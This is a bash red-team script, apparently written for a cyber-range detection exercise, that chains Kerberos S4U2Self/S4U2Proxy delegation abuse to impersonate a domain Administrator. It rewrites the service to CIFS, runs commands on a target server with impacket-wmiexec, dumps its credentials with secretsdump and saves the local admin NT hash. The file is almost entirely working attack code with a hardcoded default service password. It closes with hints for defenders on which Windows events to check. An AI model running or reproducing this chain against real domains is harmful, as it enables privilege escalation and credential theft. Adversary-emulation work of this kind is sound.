#!/bin/bash
# ============================================================
# TTP2: S4U2Self / S4U2Proxy Constrained Delegation Abuse
# MITRE: T1550.003 — Use Alternate Authentication Material: Pass the Ticket
# MITRE: T1558 — Steal or Forge Kerberos Tickets
# APT29 Ref: SolarWinds — identity token manipulation
# ============================================================
# PURPOSE: Generates Event 4769 (TGS with delegation flags) on DC02,
#          Event 4624 Type 3 on SRV05-API.
# RUN FROM: Kali (attacker machine)
# PREREQ: svc_web password from TTP1
# ============================================================

set -o pipefail
DOMAIN="cyberange.local"
TOOLS="/opt/redteam"
LOOT="$TOOLS/loot"
DCIP="${1:?Usage: $0 <DC_IP>}"
SVC_WEB_PASS="${2:-Summer2025!}"
SRV05="SRV05-API.$DOMAIN"

echo "[*] TTP2: S4U Delegation Abuse — T1550.003 / T1558"
echo "[*] Target: $SRV05 via svc_web delegation"
echo ""

# Sync clock
echo "[*] Syncing clock to DC..."
dc_time=$(nmap -p 445 --script smb2-time "$DCIP" 2>/dev/null | grep "date:" | grep -oP '\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}' | head -1)
[ -n "$dc_time" ] && sudo date -s "$dc_time" &>/dev/null && echo "[+] Clock synced: $dc_time"

cd "$TOOLS"
rm -f *.ccache 2>/dev/null
unset KRB5CCNAME

echo ""
echo "[*] Phase 1: Requesting S4U chain — impersonating Administrator..."
echo "[*] getST: S4U2Self → S4U2Proxy → altservice CIFS"
echo ""

impacket-getST "$DOMAIN/svc_web:$SVC_WEB_PASS" \
  -spn "HTTP/$SRV05" \
  -impersonate Administrator \
  -altservice "CIFS/$SRV05" \
  -dc-ip "$DCIP" 2>&1 | tee "$LOOT/ttp2_s4u_output.txt"

CCACHE=$(ls -t *.ccache 2>/dev/null | head -1)
if [ -z "$CCACHE" ]; then
    echo "[-] S4U failed. No ticket generated."
    exit 1
fi
export KRB5CCNAME="$CCACHE"
echo "[+] Ticket: $CCACHE"

sleep 2

echo ""
echo "[*] Phase 2: Verifying CIFS access to $SRV05 as Administrator..."
echo ""
impacket-wmiexec -k -no-pass "$DOMAIN/Administrator@$SRV05" 'whoami && hostname && ipconfig' 2>&1 | tee "$LOOT/ttp2_wmi_verify.txt"

sleep 2

echo ""
echo "[*] Phase 3: Dumping local credentials from $SRV05..."
echo "[*] This generates logon events on SRV05-API"
echo ""
impacket-secretsdump -k -no-pass "$DOMAIN/Administrator@$SRV05" 2>&1 | tee "$LOOT/ttp2_secretsdump.txt"

# Extract local admin hash
ADMIN_HASH=$(awk -F: '/^Administrator:500:/ {print $4; exit}' "$LOOT/ttp2_secretsdump.txt" | tr -d '[:space:]')
if [[ "$ADMIN_HASH" =~ ^[a-fA-F0-9]{32}$ ]]; then
    echo "[+] Local Admin NT hash: $ADMIN_HASH"
    echo "$ADMIN_HASH" > "$LOOT/ttp2_admin_hash.txt"
else
    echo "[!] Could not extract admin hash. Check secretsdump output."
fi

echo ""
echo "[+] TTP2 Complete."
echo "[+] Blue team: check DC02 Security log for:"
echo "    - Event 4769 (TGS Request) with delegation flags for svc_web → Administrator"
echo "    - Unusual SPN rewrite: HTTP → CIFS in ticket"
echo "[+] Blue team: check SRV05-API Security log for:"
echo "    - Event 4624 Type 3 — Administrator logon from attacker IP"
echo "    - No prior Event 4624 for Administrator on this machine (first-ever logon)"
echo "[+] Artifacts: $LOOT/ttp2_*"
